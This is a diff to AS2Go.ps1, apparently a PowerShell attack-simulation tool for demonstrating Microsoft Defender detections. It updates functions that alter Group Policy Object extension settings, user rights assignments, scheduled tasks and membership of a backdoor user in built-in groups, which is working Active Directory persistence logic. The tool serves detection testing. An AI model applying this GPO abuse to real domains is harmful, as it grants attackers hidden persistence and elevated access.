@@ -21,7 +21,7 @@ My goal is to create expressive and representative Microsoft Defender for Endpoi
 
 .NOTES
 
-last update: 2023-10-08
+last update: 2023-10-09
 File Name  : AS2Go.ps1 | Version 3.0.x
 Author     : Holger Zimmermann | me@mrhozi.com | @HerrHozi
 
@@ -143,9 +143,11 @@ Param (
 ######                                                                     #####
 ################################################################################
 
-$lastupdate = "2023-10-08"
-$version = "3.0.0"
+$lastupdate = "2023-10-09"
+$version = "3.0.1"
 
+
+# 2023-10-08 | v3.0.1 |  UpdateSet-gPCmachineExtensionNames
 # 2023-10-08 | v3.0.0 |  Upload to Github       
 # 2023-10-08 | v2.9.9 |  Update  Region Attack Level - DOMAIN COMPROMISED AND PERSISTENCE             
 # 2023-10-06 | v2.9.8 |  Add-GPOScheduleTask & Add-TaskElementToFileScheduleTaskXml
@@ -321,6 +323,8 @@ function Set-gPCmachineExtensionNames {
     Write-Log -Message "### Start Function $myfunction ###"
     #region ################## main code | out- host #####################
 
+    [bool]$skipUpdate = $false
+
     $GUID = "{" + $GUID + "}"
     $ScheduledTasks = "{CC63F200-7309-4ba0-B154-A71CD118DBCC}"
     $Groups = "{3125E937-EB16-4b4c-9934-544FC6D24D26}"
@@ -332,6 +336,7 @@ function Set-gPCmachineExtensionNames {
 
     $idScheduleTask = "{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}"
     $idLocalGroup = "{79F92669-4224-476C-9C5C-6EFB4D87DF4A}"
+    $idUserRightsAssignment = "{827D319E-6EAC-11D2-A4EA-00C04F79F83A}"
 
     $GPO = Get-AdObject -Filter 'ObjectClass -eq "groupPolicyContainer" -and Name -eq $GUID' -Properties gPCmachineExtensionNames, DistinguishedName, name,objectClass | Select-Object gPCmachineExtensionNames, DistinguishedName
     Write-Log -Message "    >> old value $($gpo.gPCmachineExtensionNames)"
@@ -341,7 +346,10 @@ function Set-gPCmachineExtensionNames {
     }
     elseif ($CLSIDs -eq $ScheduledTasks) {
 
-        if ($gpo.gPCmachineExtensionNames.Contains($idLocalGroup)){
+        if ($null -eq $gpo.gPCmachineExtensionNames) {
+            $newvalue = $onlyScheduleTask
+        }
+        elseif ($gpo.gPCmachineExtensionNames.Contains($idLocalGroup)){
             $newvalue = $Both
         }
         else {
@@ -349,18 +357,37 @@ function Set-gPCmachineExtensionNames {
         }
     }
     elseif ($CLSIDs -eq $Groups) {
-        if ($gpo.gPCmachineExtensionNames.Contains($idScheduleTask)){
+        if ($null -eq $gpo.gPCmachineExtensionNames) {
+            $newvalue = $onlyGroup
+        }
+        elseif ($gpo.gPCmachineExtensionNames.Contains($idScheduleTask)){
             $newvalue = $Both
         }
         else {
             $newvalue = $onlyGroup
         }
     }
+    elseif ($CLSIDs -eq $idUserRightsAssignment) {
+
+
+        if ($null -eq $gpo.gPCmachineExtensionNames) {
+            $newvalue = $default
+        }
+        elseif ($gpo.gPCmachineExtensionNames.Contains($idUserRightsAssignment)){
+            $skipUpdate = $true
+        }
+        else {
+            $newvalue = $default
+            Set-ADObject -Identity $gpo.DistinguishedName -Replace @{gPCMachineExtensionNames=$newvalue}
+        }
+    }
     else {
 
     }
 
-    Set-ADObject -Identity $gpo.DistinguishedName -Replace @{gPCMachineExtensionNames=$newvalue}
+    If ($skipUpdate -eq $false){
+        Set-ADObject -Identity $gpo.DistinguishedName -Replace @{gPCMachineExtensionNames=$newvalue}
+    }
 
     Write-Log -Message "    >> new value $newvalue"
     #endregion ####################### main code #########################
@@ -515,8 +542,10 @@ function Add-GPOUserRightAssignments {
                 start-sleep 1
                 "Revision=1" | Add-Content -Path $infFilePath 
                 start-sleep 1
-
                 Write-Log -Message "    >> created file: $infFilePath"
+
+                $idUserRightsAssignment = "{827D319E-6EAC-11D2-A4EA-00C04F79F83A}"
+                Set-gPCmachineExtensionNames -GUID $ID -CLSIDs $idUserRightsAssignment
 
 
             }
@@ -901,7 +930,15 @@ function Add-GPOMemberToBuiltinGroups {
         Add-TrusteeToFileGroupsXml -xmlFilePath $xmlFilePath -LocalGroup $GroupRemoteDesktopUser -Trustee $newtrustee -SID $domainusersSID
 
         $LatestBackdoorUser = Get-KeyValue -key "LastBDUser"
-        $AdditionalUser = Get-ADUser -Identity $LatestBackdoorUser 
+
+        try {
+    $AdditionalUser = Get-ADUser -Identity $LatestBackdoorUser -ErrorAction SilentlyContinue
+}
+catch {
+    <#Do this if a terminating exception happens#>
+}
+
+        
         If ($null -ne $AdditionalUser) {
             $newtrustee = $domain + "\" + $AdditionalUser.SamAccountName
             $domainusersSID = $AdditionalUser.SID
